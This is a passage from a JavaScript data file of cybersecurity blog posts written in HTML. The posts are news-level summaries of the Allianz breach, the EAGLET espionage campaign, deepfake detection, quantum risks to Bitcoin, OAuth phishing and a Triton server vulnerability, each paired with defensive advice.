      <p>We all make mistakes. Some are bigger than others. But the way we respond, learn, and evolve is what defines us. Greg's journey proves that even the darkest tunnels can lead to brighter outcomes when truth, humility, and guidance are present.</p>
      <p>As the cybersecurity world continues to evolve, it needs more advocates like Greg—individuals who have walked the path, stumbled, and come back stronger. Their voices carry the weight of experience and the wisdom of hindsight.</p>
    </section>

    <section style="margin-top:20px;background:#e7f1ff;padding:15px;border-radius:8px;">
      <h3>🎧 Listen to the Full Story</h3><br>
      <p>Catch the full episode on <strong>Darknet Diaries – Episode 160: “Greg”</strong> to hear firsthand how a teenage hacker turned his life around and now shapes the future of cybersecurity with integrity and purpose.</p>
    </section>
  </div>
`},{id:"allianz-life-insurance-breach-july-2025",title:"🚨 Allianz Life Insurance Breach Exposes 1.4 Million Users",date:"2025-07-28",author:"EthicalByte",summary:"A social engineering attack via a third-party CRM platform compromised the data of 1.4 million Allianz Life customers. The breach illustrates growing risks tied to vendor dependencies, human factors, and evolving attack surfaces in the insurance industry.",tags:["Data Breach","Cybersecurity","Social Engineering","Third-Party Risk","Insurance Security"],imageKey:"allianzBreachBanner",content:`
  <div style="background-color:#f9f9f9;padding:24px;border-radius:10px;border:1px solid #ddd;">
    <div style="text-align:center;">
      <h2>🚨 Allianz Life Insurance Breach Exposes 1.4 Million Users</h2><br>
      <p><i>Published: July 16, 2025 | Author: EthicalByte</i></p>
    </div>

    <section>
      <h3>🧩 What Happened?</h3><br>
      <p>On July 16, 2025, Allianz Life Insurance Company of North America confirmed a significant cybersecurity incident involving the compromise of a third-party CRM vendor. Threat actors used <strong>social engineering tactics</strong> to manipulate support staff, gaining unauthorized access to sensitive client records.</p>
      <p>While <strong>no financial or password data</strong> was breached, personal identifiable information (PII) — including names, emails, policy numbers, and partial SSNs — of nearly <strong>1.4 million U.S. customers</strong> were exposed. Internal employee records were also impacted in limited cases.</p>
    </section>

    <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
      <h3>🔑 Key Insights</h3><br>
      <ul>
        <li>🎯 <strong>Social Engineering Vector:</strong> Attackers didn't break in — they were <em>let in</em> through carefully crafted human manipulation.</li>
        <li>🧩 <strong>Third-Party Vulnerability:</strong> The CRM vendor was integrated into Allianz systems, providing an indirect access route.</li>
        <li>📈 <strong>Increasing Trend:</strong> Over 30% of modern data breaches now involve third-party service providers.</li>
        <li>🕵️ <strong>Delayed Detection:</strong> The breach went unnoticed for days until suspicious behavior triggered an internal investigation.</li>
      </ul>
    </section>

    <section style="margin-top:20px;">
      <h3>💥 Business Impact</h3><br>
      <ul>
        <li>⚖️ <strong>Regulatory Scrutiny:</strong> Allianz is under review by the U.S. Federal Trade Commission (FTC) and several state-level data protection authorities.</li>
        <li>📉 <strong>Reputational Fallout:</strong> Initial reports caused a 2.3% drop in parent company Allianz SE’s stock within 24 hours.</li>
        <li>💬 <strong>Customer Distrust:</strong> Policyholders expressed concern over the safety of their data, leading to increased service cancellation requests.</li>
      </ul>
    </section>

    <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
      <h3>✅ What You Can Do</h3><br>
      <ul>
        <li>🔐 <strong>Zero Trust Vendor Access:</strong> Treat all third-party platforms as high-risk entry points; restrict privileges accordingly.</li>
        <li>📚 <strong>Train Your Teams:</strong> Conduct continuous simulation-based social engineering training (phishing, vishing, impersonation drills).</li>
        <li>🧩 <strong>Review API Connections:</strong> Audit CRM and SaaS tool integrations regularly for excessive or outdated permissions.</li>
        <li>🛑 <strong>Monitor Lateral Movement:</strong> Deploy user behavior analytics (UBA) to detect unusual data access across vendors.</li>
        <li>📑 <strong>Vendor SLAs:</strong> Establish breach notification, response time, and compliance clauses in all vendor contracts.</li>
      </ul>
    </section>

    <section style="margin-top:20px;background:#f8d7da;padding:15px;border-radius:8px;">
      <h3>🚨 Why This Matters</h3><br>
      <p>This breach proves that even the most trusted institutions are vulnerable—not because of a lack of investment in cybersecurity, but because of <strong>unmonitored vendor pipelines and human error</strong>.</p>
      <p>As the insurance industry becomes increasingly digitized, its attack surface grows. <strong>Security strategies must now extend beyond the firewall</strong>, incorporating third-party ecosystems, workforce behavior, and supply chain transparency.</p>
    </section>

    <section style="margin-top:20px;background:#e7f1ff;padding:15px;border-radius:8px;">
      <h3>📌 Final Thought</h3><br>
      <blockquote style="border-left:4px solid #007bff;padding-left:10px;">"An attacker doesn’t need to breach your servers — they just need to fool someone who can."</blockquote>
      <p>Cybersecurity is no longer just a technical concern — it’s a <strong>trust issue</strong>. The Allianz breach offers a harsh lesson in vigilance: <em>you’re only as strong as your weakest link</em>.</p>
      <p>Make third-party security a boardroom-level priority today — because tomorrow’s breach might start with someone else’s mistake.</p>
    </section>
  </div>
`},{id:"cargo-talon-eaglet-cyber-espionage-russia-july-2025",title:"🎯 Operation CargoTalon – EAGLET Backdoor Targets Russian Aerospace Sector",date:"2025-07-29",author:"EthicalByte",summary:"A sophisticated cyber‑espionage campaign dubbed Operation CargoTalon used the EAGLET backdoor to infiltrate Russian aerospace organizations, marking a major escalation in state-linked hacking activity.",tags:["Cyber Espionage","EAGLET","Russian Aerospace","Operation CargoTalon","UNG0901","InfoSec"],imageKey:"cargoTalonBanner",content:`
  <div style="background:#fdfdfd;padding:24px;border-radius:12px;border:1px solid #e2e8f0;font-size:15px;line-height:1.6;color:#1e293b;">

    <div style="text-align:center;margin-bottom:20px">
      <h2 style="color:#1e293b;">🎯 Operation CargoTalon – EAGLET Backdoor Targets Russian Aerospace</h2><br>
      <p><i>Published: July 25, 2025 | Author: EthicalByte</i></p>
    </div>

    <section>
      <h3 style="color:#1e293b;">🔍 What Happened?</h3><br>
      <p>Cybersecurity researchers uncovered a stealthy operation—<strong>Operation CargoTalon</strong>—that delivered a sophisticated backdoor named <strong>EAGLET</strong> to compromise Russian aerospace and defense firms. The threat actor behind this is tracked as <strong>UNG0901</strong>.</p>
      <p>The group relied on phishing lures using transport and logistics themes, tricking users into downloading ZIP files containing Windows shortcut (.lnk) files. These launched PowerShell scripts that executed a fake document and installed EAGLET in the background.</p>
    </section>

    <section style="margin-top:20px;background:#fffbea;padding:16px;border-radius:10px;">
      <h3 style="color:#92400e;">🛠️ Attack Mechanics</h3><br>
      <ul>
        <li>📎 ZIP Archive includes transport-themed filenames like <em>“TTN‑Reference‑Sheet.zip”</em></li>
        <li>🔗 LNK file silently runs PowerShell, deploying a decoy Excel file</li>
        <li>🧬 Injects the <strong>EAGLET</strong> backdoor DLL with shell command and file access capability</li>
        <li>🌐 Connects to C2 IP: <code>185.225.17.104</code></li>
      </ul>
    </section>

    <section style="margin-top:20px;background:#f8d7da;padding:15px;border-radius:8px;">
      <h3 style="color:#1e293b;">📊 Why It Matters</h3><br>
      <ul>
        <li>🚨 <strong>Target:</strong> High-value defense and aerospace networks</li>
        <li>🛡️ <strong>Strategic Espionage:</strong> Long-term persistence possible using DLL sideloading</li>
        <li>🎭 <strong>Disguise:</strong> Using business documents increases phishing success rate</li>
      </ul>
      <p>This campaign highlights how cyber‑espionage no longer requires zero-days when attackers exploit human behavior and predictable file structures.</p>
    </section>

    <section style="margin-top:20px;background:#ecfdf5;padding:16px;border-radius:10px;">
      <h3 style="color:#047857;">✅ How to Defend</h3><br>
      <ul>
        <li>📧 Run phishing simulations with document-based bait</li>
        <li>🔎 Alert on PowerShell running via Explorer shortcuts</li>
        <li>🔐 Monitor traffic to suspicious C2 infrastructure</li>
        <li>📚 Train all employees—not just IT—on threat vector recognition</li>
      </ul>
    </section>

    <section style="margin-top:20px;background:#e0f2fe;padding:16px;border-radius:10px;">
      <h3 style="color:#0369a1;">🌐 Broader Implications</h3><br>
      <p>Operations like CargoTalon are increasing in frequency, often linked to nation-state actors. Russian, Chinese, North Korean, and other aligned APTs are shifting from destructive malware to <strong>targeted exfiltration and silent persistence</strong>.</p>
      <p>UNG0901’s methods align with other reported campaigns in the Asia‑Europe corridor. The inclusion of multiple decoy documents also points to multi-sector targeting across transport, defense, and policy organizations.</p>
    </section>

    <section style="margin-top:20px;">
      <h3 style="color:#1e293b;">📌 Final Thought</h3><br>
      <blockquote style="border-left:4px solid #0369a1;padding-left:12px;">"CargoTalon shows us that even logistics paperwork can be weaponized—reminding us that digital warfare thrives on everyday trust."</blockquote>
      <p>The takeaway? A ZIP file with a familiar name might be the launchpad for state-level intrusion. The key to stopping it is layered defense, proactive awareness, and training that treats every file like a possible threat.</p>
    </section>

    
  </div>
`},{id:"vastav-ai-deepfake-detection-july-2025",title:"🎯 Vastav AI: India’s Real-Time Deepfake Defense System",date:"2025-07-30",author:"EthicalByte",summary:"Vastav AI, India’s first indigenous real-time deepfake detection system developed by Zero Defend Security, is transforming how we combat misinformation by offering 99% accuracy across images, audio, and video.",tags:["Deepfake Detection","AI in Cybersecurity","Zero Defend Security","Misinformation","India Cybersecurity"],imageKey:"vastavAIDeepfakeBanner",content:`
  <div style="background-color:#f9fafb;padding:24px;border-radius:12px;border:1px solid #e5e7eb;">

    <div style="text-align:center;">
      <h3 style="color:#111827;">🧠 Vastav AI: India’s Real-Time Deepfake Defense System</h3><br>
      <p style="font-style:italic;color:#6b7280;">Where truth meets technology — Vastav AI takes on the era of misinformation with real-time precision.</p>
    </div>

    <section style="margin-top:24px;">
      <h4 style="color:#b91c1c;">📢 What Happened?</h4><br>
      <p>In 2025, <strong>Zero Defend Security</strong> introduced <strong>Vastav AI</strong> — India’s first AI-powered deepfake detection system built for real-time authenticity analysis of images, videos, and audio. With fake media spiraling out of control, Vastav promises up to 99% accuracy using advanced neural networks.</p>
      <p>This innovation responds directly to the rise of manipulated media in politics, social engineering, cybercrime, and misinformation warfare.</p>
    </section>

    <section style="margin-top:24px;background:#fef3c7;padding:20px;border-radius:8px;">
      <h4 style="color:#92400e;">🧪 Technical Breakdown</h4><br>
      <ul>
        <li>🤖 <strong>AI Core:</strong> Built on large transformer-based neural networks for deep media pattern recognition.</li>
        <li>🧠 <strong>Cross-Modality Detection:</strong> Works across multiple formats — audio, video, and image frames.</li>
        <li>🚀 <strong>Low Latency:</strong> Offers real-time predictions ideal for broadcast, legal, and field use.</li>
        <li>🔌 <strong>Public APIs:</strong> Integrates easily with journalistic platforms, social media checkers, and law enforcement dashboards.</li>
      </ul>
    </section>

    <section style="margin-top:24px;">
      <h4 style="color:#1d4ed8;">📈 Real-World Applications</h4><br>
      <ul>
        <li>📰 <strong>News Verification:</strong> Major TV channels and media use Vastav to validate viral clips before airing.</li>
        <li>👮 <strong>Police Evidence Vetting:</strong> Used in cybercrime units to assess authenticity of video proof.</li>
        <li>🎓 <strong>Research & Academia:</strong> Supports detection of synthetic interviews or altered documentation in thesis defenses.</li>
        <li>🗳️ <strong>Election Monitoring:</strong> Helps EC & monitoring bodies during elections to counter propaganda videos.</li>
      </ul>
    </section>

    <section style="margin-top:24px;background:#e0f2fe;padding:20px;border-radius:8px;">
      <h4 style="color:#0c4a6e;">🚧 Challenges Ahead</h4><br>
      <ul>
        <li>📊 <strong>Dataset Bias:</strong> Indian languages and regional content require more diverse training data.</li>
        <li>📉 <strong>False Flags:</strong> Occasional over-corrections could flag authentic videos, risking trust.</li>
        <li>🧠 <strong>Arms Race:</strong> Deepfake models like Sora or StyleGAN evolve rapidly — Vastav must adapt faster.</li>
      </ul>
    </section>

    <section style="margin-top:24px;background:#ecfdf5;padding:20px;border-radius:8px;">
      <h4 style="color:#065f46;">🔍 Why This Matters</h4><br>
      <p>Vastav AI symbolizes India’s entrance into the elite club of real-time cybersecurity defense technology. With global conflicts, political disruption, and misinformation pandemics on the rise — tools like Vastav offer a digital shield for truth, reputation, and democracy.</p>
      <p>It isn’t just a tool — it’s a **strategic cybersecurity asset** born out of India’s growing AI capabilities.</p>
    </section>

    <section style="margin-top:24px;">
      <h4 style="color:#7c3aed;">💬 Industry Response</h4><br>
      <ul>
        <li>🔎 <strong>Cybersecurity Analysts:</strong> Calling it the “Indian version of Reality Defender.”</li>
        <li>📢 <strong>Journalists:</strong> Applaud its potential in fighting misinformation in rural and low-tech areas.</li>
        <li>🎯 <strong>Lawmakers:</strong> Encouraging regulation that includes Vastav-style checks on social media uploads.</li>
      </ul>
    </section>

    <section style="margin-top:24px;background:#f3f4f6;padding:20px;border-radius:8px;">
      <h4 style="color:#111827;">🌐 The Global Lens</h4><br>
      <p>While global firms like Microsoft and Reality Defender dominate AI deepfake detection, Vastav is among the first real-time native systems purpose-built for India’s sociopolitical context. Its independence from western platforms ensures privacy, regional understanding, and sovereign scalability.</p>
    </section>

    <section style="margin-top:24px;">
      <h4 style="color:#4b5563;">🌟 Final Thoughts</h4><br>
      <blockquote style="border-left:4px solid #6366f1;padding-left:12px;">"In a world where truth is constantly distorted, Vastav AI is not just a defense mechanism — it’s a digital compass."</blockquote>
      <p>As India enters its AI decade, the launch of Vastav AI marks a new phase in securing digital truth. This 50th blog post celebrates not just a product but a national milestone — where cyber defense meets innovation, ethics, and urgency.</p>
    </section>

  </div>
`},{id:"quantum-bitcoin-resurrection-july-2025",title:"🧠 Quantum Threat: Could Lost Bitcoin Be Resurrected?",date:"2025-07-31",author:"EthicalByte",summary:"Quantum computers could soon unlock access to long-lost or dormant Bitcoin wallets by breaking the cryptography behind them. While it might sound like science fiction, the threat is real—and approaching faster than we think.",tags:["Quantum Computing","Bitcoin","ECDSA","Cryptography","Cybersecurity","Post-Quantum Security"],imageKey:"quantumBitcoinBanner",content:`
  <div style="background-color:#f9f9f9;padding:20px;border-radius:12px;border:1px solid #ddd;">

    <div style="text-align:center;"><br>
      <h3 style="color:#1a1a1a;">🧠 Quantum Threat: Could Lost Bitcoin Be Resurrected?</h3><br>
      <p style="font-style:italic;">If quantum computers evolve faster than crypto standards, trillions in digital value could be cracked open.</p>
    </div>

    <section style="margin-top:20px;">
      <h4 style="color:#6a1b9a;">🌐 What’s the Big Idea?</h4><br>
      <p>Quantum computing poses a unique risk to digital assets like Bitcoin. These machines don’t just compute faster—they operate on a different mathematical paradigm. The <strong>Elliptic Curve Digital Signature Algorithm (ECDSA)</strong>—which secures Bitcoin’s private keys—was never built with quantum resistance in mind.</p>
      <p>This means a powerful enough quantum computer could <strong>derive a private key from a public Bitcoin address</strong>, especially if the public key has already been revealed through a previous transaction.</p>
    </section>

    <section style="margin-top:20px;background:#f3e5f5;padding:15px;border-radius:8px;">
      <h4 style="color:#4a148c;">💻 Technical Breakdown</h4><br>
      <ul>
        <li>🔐 <strong>ECDSA Vulnerability:</strong> Based on the difficulty of solving discrete logarithm problems — something classical computers struggle with, but quantum computers could crack with Shor’s Algorithm.</li>
        <li>⚛️ <strong>Shor’s Algorithm:</strong> Designed to factor large primes and solve problems underpinning public key cryptography—effectively reducing ECDSA’s complexity from “infeasible” to “solvable.”</li>
        <li>🧠 <strong>Quantum Readiness:</strong> Bitcoin addresses are safe until their public key is exposed (usually during outgoing transactions). After that, they become vulnerable.</li>
        <li>🧱 <strong>Blockchain Permanence:</strong> Once public keys are on the blockchain, they’re available forever — meaning they could be targeted years or decades later.</li>
      </ul>
    </section>

    <section style="margin-top:20px;">
      <h4 style="color:#00796b;">📉 What’s at Risk?</h4><br>
      <ul>
        <li>🪙 <strong>Lost Wallets:</strong> Over <strong>4 million Bitcoins</strong> (worth billions) are believed to be lost. Quantum breakthroughs could resurrect these—possibly into the wrong hands.</li>
        <li>👤 <strong>Early Users:</strong> Early adopters who used simple or reused keys are more at risk, especially if they’ve exposed public keys in past transactions.</li>
        <li>🏦 <strong>Exchanges & Custodians:</strong> Platforms holding crypto on behalf of clients must move fast to adopt post-quantum standards—or face systemic risk.</li>
        <li>📉 <strong>Market Panic:</strong> Even the rumor of a working quantum attack could shake global confidence and cause massive sell-offs.</li>
      </ul>
    </section>

    <section style="margin-top:20px;background:#d7ffd9;padding:15px;border-radius:8px;">
      <h4 style="color:#1b5e20;">🛡️ What Can We Do Today?</h4><br>
      <ul>
        <li>✅ <strong>Upgrade Wallets:</strong> Start using quantum-resistant or multi-signature wallets where possible.</li>
        <li>✅ <strong>Post-Quantum Research:</strong> Follow progress from <a href="https://csrc.nist.gov/projects/post-quantum-cryptography" target="_blank">NIST’s PQC initiative</a> which is finalizing algorithms immune to quantum attacks.</li>
        <li>✅ <strong>Network Vigilance:</strong> Developers and miners should begin discussions on quantum-safe forks and transitions for vulnerable coins.</li>
        <li>✅ <strong>Minimize Public Exposure:</strong> Refrain from reusing addresses and only reveal public keys when necessary.</li>
      </ul>
    </section>

    <section style="margin-top:20px;background:#fffde7;padding:15px;border-radius:8px;">
      <h4 style="color:#f9a825;">📚 Did You Know?</h4><br>
      <ul>
        <li>📡 Google’s 2019 quantum supremacy experiment solved a problem in 200 seconds that would take supercomputers 10,000 years.</li>
        <li>🧩 Ethereum has similar cryptographic weaknesses — and Vitalik Buterin has publicly spoken about quantum concerns.</li>
        <li>🌍 Governments and intelligence agencies are already <strong>harvesting encrypted data</strong> today to decrypt later with quantum tools—a strategy known as “store now, decrypt later.”</li>
      </ul>
    </section>

    <section style="margin-top:20px;background:#e3f2fd;padding:15px;border-radius:8px;">
      <h4 style="color:#1565c0;">🔭 Final Thoughts</h4><br>
      <blockquote style="border-left:4px solid #1565c0;padding-left:10px;">"Quantum computing could be both the grave robber and the guardian of crypto."</blockquote>
      <p>Quantum threats to Bitcoin aren’t here yet — but they’re coming. Whether it’s by choice or by breach, the ecosystem must evolve. From the Bitcoin core dev team to casual holders, <strong>post-quantum migration plans must begin now</strong>.</p>
      <p>In a digital age where <strong>mathematics = trust</strong>, we must prepare for the moment when math itself gets upgraded.</p>
    </section>

  </div>
`},{id:"nigeria-ai-cybersecurity-gap-july-2025",title:"🤖 AI-Powered Tools Can Bridge Nigeria’s Cybersecurity Gaps – Sophos",date:"2025-08-01",author:"EthicalByte",summary:"Sophos executive Prish Thaakar emphasizes how Nigerian organizations can leverage AI and machine learning to detect threats faster, reduce data breaches, and build resilience against evolving cyberattacks.",tags:["Nigeria","AI Security","Sophos","Cybersecurity Strategy","Prish Thaakar"],imageKey:"nigeriaAICybersecurityBanner",content:`
  <div style="background-color:#f8f9fa;padding:20px;border-radius:12px;border:1px solid #ddd;">

    <div style="text-align:center;"><br>
      <h3 style="color:#1a1a1a;">🤖 AI-Powered Tools Can Bridge Nigeria’s Cybersecurity Gaps – Sophos</h3><br>
      <p style="font-style:italic;">Artificial Intelligence could become Nigeria’s frontline defense against digital threats.</p>
    </div>

    <section style="margin-top:20px;">
      <h4 style="color:#e63946;">📢 What Happened?</h4><br>
      <p>According to <strong>Prish Thaakar</strong>, a senior executive at Sophos, Nigeria’s current cybersecurity posture can be significantly strengthened through AI-powered solutions.</p>
      <p>In an interview with Vanguard, he outlined how machine learning and automation could help Nigerian firms detect and respond to sophisticated threats in real time — reducing response time, cost, and human error.</p>
    </section>

    <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
      <h4 style="color:#856404;">🧠 Why AI Is a Game-Changer</h4><br>
      <ul>
        <li>🚨 <strong>Threat Prediction:</strong> AI models can anticipate attack patterns before they strike.</li>
        <li>⚙️ <strong>Automated Response:</strong> Machine learning can flag anomalies and trigger rapid responses without human delay.</li>
        <li>🔍 <strong>Data-Driven Insights:</strong> Organizations gain deeper understanding of attack surfaces and weak points.</li>
        <li>🔐 <strong>Scalability:</strong> Even small businesses can deploy AI tools to protect digital assets affordably.</li>
      </ul>
    </section>

    <section style="margin-top:20px;">
      <h4 style="color:#457b9d;">🌍 Nigeria’s Cybersecurity Landscape</h4><br>
      <p>Nigeria, like many developing nations, has faced rising incidents of ransomware, phishing, and insider attacks. A large digital population, coupled with under-resourced IT teams, has made the country vulnerable.</p>
      <p>By adopting AI tools from vendors like Sophos, Nigerian institutions could close detection gaps, protect customer data, and comply with national digital safety policies.</p>
    </section>

    <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
      <h4 style="color:#155724;">✅ What Needs to Happen</h4><br>
      <ul>
        <li>💡 <strong>Upskilling:</strong> Encourage cybersecurity training to maximize AI tool usage.</li>
        <li>🔗 <strong>Public-Private Collaboration:</strong> Gov & private sectors must jointly invest in AI readiness.</li>
        <li>📊 <strong>Adoption of Threat Intelligence:</strong> Shareable, AI-enhanced threat feeds can increase collective resilience.</li>
      </ul>
    </section>

    <section style="margin-top:20px;">
      <h4 style="color:#1a73e8;">🌟 Final Thoughts</h4><br>
      <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“In a connected world, cybersecurity is no longer optional — and AI is no longer futuristic.”</blockquote>
      <p>Prish Thaakar’s insights serve as a wake-up call for Nigeria’s cybersecurity industry. Strategic AI deployment could transform vulnerability into strength, and create a secure digital future for West Africa’s tech hub.</p>
    </section>

  </div>
`},{id:"microsoft-oauth-tycoon-phishing-august-2025",title:"🎯 Fake OAuth Apps + Tycoon Kit: 3,000+ Microsoft 365 Accounts Breached",date:"2025-08-02",author:"EthicalByte",summary:"A stealthy phishing campaign using fake Microsoft OAuth apps and the Tycoon kit has compromised thousands of Microsoft 365 accounts. It bypasses MFA and mimics over 50 known brands. This operation is a masterclass in modern-day identity hijacking.",tags:["OAuth","Phishing","Microsoft 365","Tycoon Kit","Cybersecurity","Adversary-in-the-middle"],imageKey:"microsoftOauthTycoonAttack",content:`
  <div style="background-color:#fbfbfb;padding:20px;border-radius:12px;border:1px solid #e0e0e0;">

    <div style="text-align:center;">
      <h3 style="color:#1a1a1a;">🎯 Fake OAuth Apps + Tycoon Kit: 3,000+ Microsoft 365 Accounts Breached</h3><br>
      <p style="font-style:italic;color:#666;">A phishing campaign so advanced, it didn’t need passwords.</p>
    </div>

    <p>
      A highly coordinated phishing operation has exploited fake Microsoft OAuth apps combined with the Tycoon phishing kit, breaching over <strong>3,000 users across 900 organizations</strong>. 
      The attackers bypassed Multi-Factor Authentication (MFA) using adversary-in-the-middle (AiTM) infrastructure and tricked victims into authorizing malicious applications — all while maintaining long-term access to cloud data.
    </p>

    <p>
      Victims clicked on phishing emails that led them to spoofed Microsoft login pages. These pages were actually AiTM proxies that intercepted credentials and authentication tokens. 
      From there, users were prompted to grant OAuth permissions to fake apps cleverly disguised as Microsoft Teams, Adobe, SharePoint, or DocuSign integrations.
    </p>

    <p>
      Once the permissions were granted, the attackers didn’t need usernames or passwords anymore. They could access emails, calendars, OneDrive files, and Teams messages — all through OAuth token access. 
      The Tycoon phishing kit automated much of the infrastructure, handling session hijacking, brand spoofing, and token persistence in a seamless flow.
    </p>

    <p>
      Microsoft confirmed that these fake apps were hosted in legitimate cloud environments and even passed basic domain verification. Because they abused the OAuth consent model, victims didn’t realize anything had gone wrong.
    </p>

    <div style="background:#fff3cd;padding:15px;border-radius:8px;margin-top:20px;border:1px solid #ffecb5;">
      <p><strong>Highlights:</strong><br>
      • 3,000+ users affected across 900+ companies<br>
      • 50+ spoofed app brands used to lure victims<br>
      • MFA bypassed with adversary-in-the-middle proxies<br>
      • Access granted via consent to fake OAuth apps<br>
      • Attackers used token refresh mechanisms to maintain persistence<br>
      </p>
    </div>

    <p style="margin-top:20px;">
      This is a critical lesson for defenders: Cloud security is not just about strong passwords or even MFA anymore. It’s about understanding how OAuth scopes and token lifetimes work, auditing what applications users are authorizing, and restricting third-party app access by default.
    </p>

    <p>
      Organizations are advised to review tenant-wide OAuth policies, restrict user consent, and regularly scan for anomalous cloud app activity. User education around fake app consent requests is now as vital as phishing awareness itself.
    </p>

    <p style="margin-top:20px;">
      This campaign is one of the most sophisticated examples of phishing-as-a-service we’ve seen in 2025 — stealthy, brand-polished, and identity-focused. It proves one thing: attackers no longer just want your credentials. They want your trust.
    </p>

  </div>
`},{id:"network-security-digital-era-august-2025",title:"🛡️ Network Security in the Digital Era: Safeguarding the Digital World",date:"2025-08-04",author:"EthicalByte",summary:"In an interconnected world, effective network security demands a multi-layered approach—from firewalls and IDS to training and incident planning. This blog explores what it takes to stay secure in 2025 and beyond.",tags:["Network Security","Cybersecurity Strategies","Digital Infrastructure","Encryption","Firewall","IDS"],imageKey:"networkSecurityDigitalEraBanner",content:`
  <div style="background-color:#f8f9fa;padding:20px;border-radius:12px;border:1px solid #ddd;">
    
    <div style="text-align:center;"><br>
      <h3 style="color:#1a1a1a;">🛡️ Network Security in the Digital Era: Safeguarding the Digital World</h3><br>
      <p style="font-style:italic;">A secure network is no longer optional—it's the foundation of digital resilience.</p>
    </div>

    <section style="margin-top:20px;">
      <h4 style="color:#e63946;">🌐 The Modern Threat Landscape</h4><br>
      <p>From ransomware attacks to nation-state espionage, today’s digital environment demands a proactive and robust network defense strategy. The increasing complexity of infrastructure and cloud integration introduces more attack vectors than ever before.</p>
    </section>

    <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
      <h4 style="color:#856404;">🔐 Building Stronger Defenses</h4><br>
      <ul>
        <li>🧱 <strong>Firewalls:</strong> Your first line of defense against unauthorized access.</li>
        <li>🕵️‍♂️ <strong>Intrusion Detection Systems (IDS):</strong> Real-time detection of suspicious activity.</li>
        <li>🔒 <strong>Encryption:</strong> End-to-end data protection during transmission and at rest.</li>
        <li>🛠️ <strong>Regular Software Updates:</strong> Patch known vulnerabilities before attackers do.</li>
      </ul>
    </section>

    <section style="margin-top:20px;">
      <h4 style="color:#457b9d;">👨‍🏫 Human Element in Cybersecurity</h4><br>
      <p>Technology alone isn’t enough. Employees are often the weakest link in the security chain. Consistent training on phishing awareness, password hygiene, and secure practices is critical to building a cyber-aware workforce.</p>
    </section>

    <section style="margin-top:20px;background:#f0f0f0;padding:15px;border-radius:8px;">
      <h4 style="color:#2a2a2a;">📦 Incident Response & Resilience</h4><br>
      <p>When prevention fails, response speed matters. An effective incident response plan minimizes damage, ensures regulatory compliance, and restores operations efficiently. Testing and updating the plan regularly is non-negotiable.</p>
    </section>

    <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
      <h4 style="color:#155724;">🚀 Future-Proofing Security</h4><br>
      <ul>
        <li>🧠 Integrate AI/ML for anomaly detection.</li>
        <li>⚙️ Automate routine threat analysis.</li>
        <li>📡 Secure IoT devices and remote endpoints.</li>
        <li>📊 Conduct regular audits and penetration testing.</li>
      </ul>
      <p>As cyberattacks grow in sophistication, adapting and upgrading your defenses is critical for long-term resilience.</p>
    </section>

    <section style="margin-top:20px;">
      <h4 style="color:#1a73e8;">💡 Final Thoughts</h4><br>
      <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“Cybersecurity is a journey, not a destination. Stay aware. Stay updated. Stay secure.”</blockquote>
      <p>Whether you're protecting a small business or managing national infrastructure, effective network security is the backbone of trust in a digital world. The threats are real—but so are the solutions.</p>
    </section>

  </div>
`},{id:"nvidia-triton-ai-rce-2025",title:"NVIDIA Triton AI Servers Can Be Hijacked — No Login Needed",date:"2025-08-05",author:"EthicalByte",summary:"New critical vulnerabilities in NVIDIA's Triton Inference Server expose AI infrastructure to unauthenticated remote code execution. Researchers warn it could lead to full model theft and unauthorized control.",tags:["NVIDIA","Triton","AI Security","Remote Code Execution","Model Theft","Unauthenticated Access"],imageKey:"nvidiaTritonExploit",content:`
    <div style="background-color:#f6f8fa;padding:20px;border-radius:12px;border:1px solid #ddd;">
      <h3 style="color:#c53030;">🚨 <br> Critical RCE Vulnerability in NVIDIA Triton AI Servers</h3><br>
      <h3>🧠 What Happened?</h3><br>
      <ul>
        <li>🚀 Researchers discovered a <strong>chain of vulnerabilities</strong> in <strong>NVIDIA’s Triton Inference Server</strong>.</li>
        <li>💥 Exploitation leads to <strong>unauthenticated remote code execution (RCE)</strong>.</li>
        <li>🎯 Attackers can fully hijack servers, steal AI models, manipulate predictions, or implant malware.</li>
        <li>🛠 The exploit starts with a <strong>single malformed HTTP request</strong> that bypasses authentication checks.</li>
      </ul>

      <h3>🔍 Why It Matters</h3><br>
      <p>NVIDIA Triton is widely used in AI production environments — including cloud AI workloads, model inference APIs, and internal ML Ops pipelines. A breach here could compromise:</p>
      <ul>
        <li>📊 Proprietary AI models & training data</li>
        <li>🔓 Intellectual property and competitive strategies</li>
        <li>🧠 Real-time inference results (autonomous driving, finance, etc.)</li>
      </ul>

      <h3>📌 Technical Overview</h3><br>
      <ul>
        <li>🧱 Vulnerabilities are related to insecure default settings and improper input sanitization in the model control APIs.</li>
        <li>🌐 No login or API key needed in certain misconfigured environments — opens up direct access to attackers.</li>
        <li>⚠ Unpatched Triton servers are a serious security risk in shared compute clusters and cloud workloads.</li>
      </ul>

      <h3>🛡 Recommendations</h3><br>
      <ul>
        <li>📥 Immediately update to the latest patched Triton release.</li>
        <li>🔐 Enforce strict authentication and tokenized API access.</li>
        <li>📉 Disable unused endpoints and monitor for anomalous inference requests.</li>
        <li>🛑 Limit external exposure of Triton instances and apply network segmentation.</li>
      </ul>

      <h3>📢 Final Thoughts</h3><br>
      <p>This is another stark reminder that <strong>AI infrastructure is a prime cyber target</strong>. As ML models become central to business and innovation, securing inference endpoints is no longer optional — it’s mission-critical.</p>

      <blockquote style="border-left:4px solid #c53030;padding-left:1em;margin-top:1em;">
        One malformed packet — and your AI is under enemy control.
      </blockquote>
    </div>
  `},{id:"generative-ai-cybersecurity-role",title:"The Role of Generative AI in Cybersecurity",date:"2025-08-06",author:"EthicalByte",summary:"Generative AI isn’t just for content—it’s changing cybersecurity too. From simulating attacks to anomaly detection, learn how AI is transforming defenses.",tags:["Generative AI","Cybersecurity","AI Security","Threat Detection","Cyber Defense"],imageKey:"generativeAICyberBanner",content:`
    <div style="background:linear-gradient(135deg,#e0e7ff,#f0fdf4);padding:1.5em;border-radius:12px;color:#111;">
      <h3>🧠 The Role of Generative AI in Cybersecurity</h3><br>
      
      <p>Generative AI has moved far beyond art tools and chat assistants—it's now playing a critical role in shaping how we <strong>defend against cyber threats</strong>. As digital threats grow more sophisticated, defenders are turning to AI to keep pace.</p>
      
